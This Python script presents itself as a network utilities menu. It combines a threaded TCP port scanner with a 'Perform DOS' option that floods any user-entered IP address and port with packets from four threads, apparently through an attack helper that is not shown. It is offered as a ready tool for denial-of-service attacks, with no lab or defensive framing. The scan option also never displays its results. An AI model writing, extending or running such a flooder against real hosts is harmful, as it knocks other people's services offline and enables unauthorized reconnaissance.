import socket
import threading
import time

from utils.attack import send_packet


def scan_port(target, port, results, lock):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        s.close()

        if result == 0:
            with lock:
                results.append({'port': port, 'status': 'open'})
        else:
            with lock:
                results.append({'port': port, 'status': 'closed'})

    except Exception:
        with lock:
            results.append({'port': port, 'status': 'error'})


def start_scan(target_ip, ports_to_scan_list):
    threads = []
    results = []
    lock = threading.Lock()

    for port in ports_to_scan_list:
        thread = threading.Thread(target=scan_port, args=(target_ip, port, results, lock))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    return results


def start_attack(target_ip, target_port, packet_count_total):
    packets_sent_counter = 0
    counter_lock = threading.Lock()

    def attack_thread_finite():
        nonlocal packets_sent_counter
        while True:
            with counter_lock:
                if packets_sent_counter >= packet_count_total:
                    return
                packets_sent_counter += 1

            try:
                send_packet(target_ip, target_port)
            except Exception as e:
                print(f"Thread error: {e}")

            time.sleep(0.00001)

    threads = []
    for _ in range(4):
        thread = threading.Thread(target=attack_thread_finite)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()


def main_menu():
    while True:
        print("\n--- Network Utilities Menu ---")
        print("1. Run Port Scan")
        print("2. Perform DOS")
        print("3. Exit")

        choice = input("Please select an option (1, 2 or 3): ")

        if choice == '1':
            target_ip_scan = input("Enter target IP for scan: ")
            ports_to_scan_list = range(1, 1025)
            start_scan(target_ip_scan, ports_to_scan_list)

        elif choice == '2':
            target_ip_dos = input("Enter target IP for DoS: ")
            target_port_dos = int(input("Enter target port for DoS: "))
            packet_count_dos = int(input("Enter total number of packets to send: "))
            start_attack(target_ip_dos, target_port_dos, packet_count_dos)

        elif choice == '3':
            print("Exiting the program. Goodbye!")
            break

        else:
            print("Invalid choice. Please type 1, 2 or 3.")


if __name__ == "__main__":
    main_menu()